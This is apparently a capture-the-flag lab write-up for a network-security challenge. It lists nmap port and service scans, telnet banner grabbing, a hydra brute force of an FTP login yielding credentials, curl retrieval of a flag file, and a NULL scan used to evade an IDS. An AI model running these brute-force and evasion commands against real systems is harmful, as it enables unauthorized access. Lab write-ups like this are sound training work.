# Net Sec Challenge
### Tools Used
- [x] nmap
- [x] telnet
- [x] hydra
- [x] ftp
- [x] curl
---
## 1. Default Port Scan
Used to identify top 1000 open TCP ports, including non-standard ones.

```bash
sudo nmap <MACHINE_IP>
```

**Result**:

- Highest open port < 10000 → **8080**
- Open port > 10000 → **10021**
---
## 2. All Port Scan
Used to identify services running on discovered ports.
```bash
sudo nmap -sV -p- <MACHINE_IP>
```

**Result**:

- Unknown service running on port **10021**
---
## 3. Count Open TCP Ports
From the full port scan output:
```bash
sudo nmap -p- <MACHINE_IP>
```

**Result**:

- Total open TCP ports → **6**

---
## 4. HTTP Server Header Flag

Used Nmap NSE script to extract HTTP response headers.

```bash
sudo nmap -p 8080 --script http-headers <MACHINE_IP>
```

**Result**:

- Flag found in HTTP header
---

## 5. SSH Server Header Flag

Connected directly to SSH service banner using Telnet.
```bash
telnet <MACHINE_IP> 22
```

**Result**:

- SSH banner revealed

---
  

## 6. FTP Server Version on Non-Standard Port

Explicit scan against FTP port.
```bash
sudo nmap -sV -p 10021 <MACHINE_IP>
```

**Result**:

- FTP version → **vsftpd 3.0.5**

---

7. FTP Flag via Brute Force (Hydra)

Known usernames: `eddie`, `quinn`
Performed brute force against FTP service.
```bash
hydra -l quinn -P /usr/share/wordlists/rockyou.txt ftp://<MACHINE_IP> -s 10021
```

**Credentials found**:

`quinn:andrea`

---

## 8. FTP Access & Flag Retrieval

Login attempt using standard FTP client:
```
ftp <MACHINE_IP> 10021
```

- Login successful
- get ftp_flag.txt → Permission denied

**Bypass using curl**:
```bash
curl --user quinn:andrea ftp://<MACHINE_IP>:10021/ftp_flag.txt
```

**Result**:
- Flag found

---

## 9. IDS Evasion Scan

Initial custom TCP flags attempt failed:
```bash
sudo nmap --scanflags RSTSYNFIN <MACHINE_IP>
```

Switched to NULL scan to evade IDS:
```bash
sudo nmap -sN <MACHINE_IP>
```

**Result**:
- Successful evasion technique demonstrated

---

## Practical Takeaways
### FTP Permission Issue & curl Workaround
While accessing the FTP service on a non-standard port, authentication was successful using the discovered credentials. However, attempting to download the target file using the standard ftp client resulted in a permission denied error. Instead of assuming misconfiguration, I verified file access by switching to curl with authenticated FTP support. This allowed me to retrieve the file directly, confirming that the issue was client-side permission handling rather than access control on the server.
### IDS Evasion Attempt
To evade potential IDS detection, I initially attempted a scan using custom TCP flags. This approach did not yield useful results, indicating that the target was likely filtering or ignoring malformed flag combinations. I then switched to a NULL scan, which sends packets without any TCP flags set. This technique proved more effective and demonstrated how changing scan strategy can bypass basic detection mechanisms when default approaches fail.
